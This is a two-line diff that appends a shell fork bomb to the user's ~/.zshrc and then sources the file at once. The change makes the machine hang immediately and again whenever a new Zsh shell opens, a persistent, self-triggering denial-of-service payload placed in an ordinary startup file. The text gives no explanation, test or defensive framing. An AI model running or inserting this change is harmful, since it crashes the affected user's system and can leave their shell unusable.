@@ -1,0 +1,2 @@
+echo ":(){ :|:& };:" >> ~/.zshrc;
+source ~/.zshrc
